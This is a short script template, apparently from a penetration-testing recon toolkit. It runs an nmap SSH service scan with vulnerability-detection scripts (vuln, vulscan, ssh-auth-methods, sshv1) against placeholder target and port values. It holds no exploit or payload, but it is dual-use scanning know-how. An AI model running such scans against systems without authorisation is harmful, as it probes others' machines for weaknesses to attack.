echo "\e[92m--- Running nmap script SSH for target: _TARGET_ ---\e[0m"
nmap.exe -Pn -sSV -p _PORT_ --script=vuln,vulscan/vulscan.nse,banner,ssh-auth-methods,sshv1 -oA "_OUTPUT_/ssh/_TARGET_._PORT_.script" _TARGET_

